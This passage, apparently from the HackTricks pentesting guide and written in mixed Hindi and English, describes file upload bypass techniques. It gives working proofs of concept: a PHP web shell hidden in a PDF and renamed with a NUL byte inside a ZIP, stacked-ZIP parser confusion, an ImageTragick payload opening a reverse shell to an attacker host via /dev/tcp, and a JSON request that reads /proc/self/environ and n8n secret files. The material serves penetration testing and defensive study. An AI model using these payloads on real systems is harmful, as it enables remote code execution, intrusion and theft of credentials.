- इसे `shell.php..pdf` जैसा नाम दें, zip करें, फिर ZIP local header और central directory filename को hex‑edit करके `.php` के बाद वाले पहले `.` को `0x00` से बदल दें, जिससे `shell.php\x00.pdf` बने।
- ZipArchive पर निर्भर करने वाले validators `shell.php .pdf` को देखेंगे और अनुमति दे देंगे; extractor डिस्क पर `shell.php` लिख देता है, जिससे upload फोल्डर executable होने पर RCE हो सकती है।

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Notes
- दोनों filename occurrences (local और central directory) बदलें। कुछ tools एक अतिरिक्त data descriptor entry भी जोड़ते हैं – यदि मौजूद हों तो सभी name fields समायोजित करें।
- payload file को अभी भी server‑side magic/MIME sniffing पास करना चाहिए। PHP को एक PDF stream में embed करने से header वैध बना रहता है।
- Works where the enum/validation path and the extraction/write path disagree on string handling.

### Stacked/concatenated ZIPs (parser disagreement)

Concatenating two valid ZIP files produces a blob where different parsers focus on different EOCD records. Many tools locate the last End Of Central Directory (EOCD), while some libraries (e.g., ZipArchive in specific workflows) may parse the first archive they find. If validation enumerates the first archive and extraction uses another tool that honors the last EOCD, a benign archive can pass checks while a malicious one gets extracted.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
दुरुपयोग पैटर्न
- एक benign archive बनाएँ (allowed type, e.g., a PDF) और एक दूसरा archive जिसमें blocked extension हो (e.g., `shell.php`)।
- इन्हें concatenate करें: `cat benign.zip evil.zip > combined.zip`।
- अगर server एक parser से validate करता है (sees benign.zip) लेकिन दूसरे से extract करता है (processes evil.zip), तो blocked file extraction path में आ जाता है।

## ImageTragic

इस content को image extension के साथ upload करें ताकि vulnerability का exploit किया जा सके **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Embedding a PHP shell in the IDAT chunk of a PNG file कुछ image processing operations को प्रभावी ढंग से बायपास कर सकता है। PHP-GD के `imagecopyresized` और `imagecopyresampled` फ़ंक्शन्स इस संदर्भ में खास तौर पर प्रासंगिक हैं, क्योंकि इन्हें आम तौर पर images को resize और resample करने के लिए उपयोग किया जाता है। एम्बेड किए गए PHP shell का इन operations से अप्रभावित रहना कुछ use-cases के लिए महत्वपूर्ण फ़ायदा देता है।

A detailed exploration of this technique, including its methodology and potential applications, is provided in the following article: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). This resource offers a comprehensive understanding of the process and its implications.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files साइबर सुरक्षा में एक अनूठा टूल हैं, जो चेमेलेन की तरह काम करते हुए एक ही समय में कई file formats में वैध रूप से मौजूद हो सकते हैं। एक रोचक उदाहरण [GIFAR](https://en.wikipedia.org/wiki/Gifar) है, जो एक hybrid है और GIF और RAR archive दोनों के रूप में काम करता है। ऐसे files केवल इस जोड़ी तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसी combinations भी संभव हैं।

Polyglot files की मुख्य उपयोगिता यह है कि ये उस तरह की security measures को बायपास कर सकती हैं जो files को उनके type के आधार पर screen करते हैं। विभिन्न applications में सामान्य प्रैक्टिस यह होती है कि केवल कुछ file types को upload के लिए अनुमति दी जाए—जैसे JPEG, GIF, या DOC—ताकि संभावित हानिकारक formats (उदाहरण के लिए JS, PHP, या Phar files) के जोखिम को कम किया जा सके। हालाँकि, एक polyglot, कई file types की structural criteria को पूरा करके इन प्रतिबंधों को stealthily बायपास कर सकता है।

उनकी अनुकूलता के बावजूद, polyglots की कुछ सीमाएँ भी होती हैं। उदाहरण के लिए, जबकि एक polyglot एक साथ PHAR file (PHp ARchive) और एक JPEG हो सकता है, इसके upload की सफलता प्लेटफ़ॉर्म की file extension नीतियों पर निर्भर कर सकती है। यदि सिस्टम allowable extensions के प्रति सख्त है, तो केवल structural duality ही upload सुनिश्चित करने के लिए पर्याप्त नहीं हो सकती।

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

How to avoid file type detections by uploading a valid JSON file even if not allowed by faking a PDF file (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: जब तक `%PDF` magic bytes पहले 1024 bytes में मौजूद हैं यह वैध माना जाएगा (उदाहरण के लिए post देखें)
- **`pdflib` library**: JSON के एक filed के अंदर एक fake PDF format डालें ताकि library इसे pdf समझ ले (उदाहरण के लिए post देखें)
- **`file` binary**: यह एक file से 1048576 bytes तक पढ़ सकता है। बस एक JSON बनाएं जो उससे बड़ा हो ताकि यह content को json के रूप में पार्स न कर सके और फिर JSON के अंदर एक वास्तविक PDF का प्रारम्भिक हिस्सा डाल दें और यह इसे PDF समझ लेगा

### Content-Type confusion to arbitrary file read

कुछ upload handlers parsed request body पर भरोसा करते हैं (उदा., `context.getBodyData().files`) और बाद में `file.filepath` से फ़ाइल कॉपी कर देते हैं बिना पहले `Content-Type: multipart/form-data` लागू किए। यदि server `application/json` स्वीकार करता है, तो आप एक fake `files` object देकर `filepath` को किसी भी local path की ओर इंगित कर सकते हैं, जिससे upload flow एक arbitrary file read primitive बन जाता है।

Example POST against a form workflow returning the uploaded binary in the HTTP response:
```http
POST /form/vulnerable-form HTTP/1.1
Host: target
Content-Type: application/json

{
"files": {
"document": {
"filepath": "/proc/self/environ",
"mimetype": "image/png",
"originalFilename": "x.png"
}
}
}
```
Backend `file.filepath` को कॉपी करता है, इसलिए response उस path की content लौटाता है. सामान्य chain: `/proc/self/environ` पढ़कर `$HOME` जानें, फिर keys के लिए `$HOME/.n8n/config` और user identifiers के लिए `$HOME/.n8n/database.sqlite` पढ़ें।

## संदर्भ

- [n8n form upload Content-Type confusion → arbitrary file read PoC](https://github.com/Chocapikk/CVE-2026-21858)
- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
